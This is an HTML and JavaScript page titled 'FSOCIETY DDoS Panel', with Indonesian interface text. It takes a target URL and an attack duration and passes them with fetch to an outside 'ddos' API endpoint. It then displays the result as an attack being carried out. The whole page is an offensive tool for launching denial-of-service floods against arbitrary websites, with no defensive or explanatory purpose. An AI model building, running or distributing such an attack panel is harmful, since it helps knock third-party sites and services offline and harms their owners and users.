<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>FSOCIETY DDoS Panel</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body, html {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      overflow-x: hidden;
      font-family: monospace;
      background: black;
    }

    .container {
      max-width: 400px;
      margin: 50px auto;
      background-color: rgba(17, 17, 17, 0.7);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 20px red;
      color: #fff;
      text-align: center;
      word-wrap: break-word;
      overflow-wrap: break-word;
    }

    .logo {
      width: 180px;
      margin-bottom: 10px;
    }

    h1 {
      font-size: 22px;
      letter-spacing: 2px;
      margin-bottom: 0;
    }

    input, button {
      width: 90%;
      padding: 10px;
      margin: 10px 0;
      background: rgba(17, 17, 17, 0.9);
      color: #ff0000;
      border: 1px solid #ff0000;
      border-radius: 5px;
      font-size: 14px;
    }

    button {
      background-color: red;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: transform 0.1s;
    }

    pre#status {
      color: #00ff00;
      font-size: 13px;
      margin-top: 15px;
      text-align: left;
      background: #000;
      border: 1px solid red;
      padding: 10px;
      border-radius: 5px;
      overflow-wrap: break-word;
      word-break: break-word;
      white-space: pre-wrap;
      display: none;
    }

    * {
      -webkit-tap-highlight-color: transparent;
    }

    input:focus, button:focus {
      outline: none;
      box-shadow: none;
    }

    button:active {
      transform: scale(0.98);
    }
  </style>
</head>
<body>

  <div class="container">
    <img class="logo" src="https://files.catbox.moe/i4hmsr.png" alt="fsociety" />
    <h1>FSOCIETY ATTACK</h1>

    <input type="text" id="targetUrl" placeholder="URL Target (tempel manual)" />
    <input type="number" id="duration" placeholder="Durasi Serangan (detik)" />
    <button id="attackButton" onclick="startAttack()">ðŸš€ Mulai Attack</button>

    <pre id="status"></pre>
  </div>

  <script>
    function startAttack() {
      const target = document.getElementById('targetUrl').value.trim();
      const duration = parseInt(document.getElementById('duration').value);
      const statusBox = document.getElementById('status');
      const attackButton = document.getElementById('attackButton');

      if (!target || !duration) {
        showStatus('â— Isi URL dan durasi serangan terlebih dahulu.');
        return;
      }

      attackButton.disabled = true;
      attackButton.textContent = 'â³ Menyerang target...';
      showStatus('â³ Menyerang target...\nMohon tunggu...');

      const encodedUrl = encodeURIComponent(target);
      const apiUrl = `https://api.natsuclouds.xyz/random/ddos?url=${encodedUrl}&duration=${duration}`;

      fetch(apiUrl)
      .then(res => res.json())
      .then(data => {
        showStatus('âœ… Serangan selesai!\n\n' + JSON.stringify(data, null, 2));
      })
      .catch(err => {
        showStatus(`â— Error: ${err}`);
      })
      .finally(() => {
        attackButton.disabled = false;
        attackButton.textContent = 'ðŸš€ Mulai Attack';
      });
    }

    function showStatus(message) {
      const statusBox = document.getElementById('status');
      statusBox.style.display = 'block';
      statusBox.textContent = message;
    }
  </script>
</body>
</html>
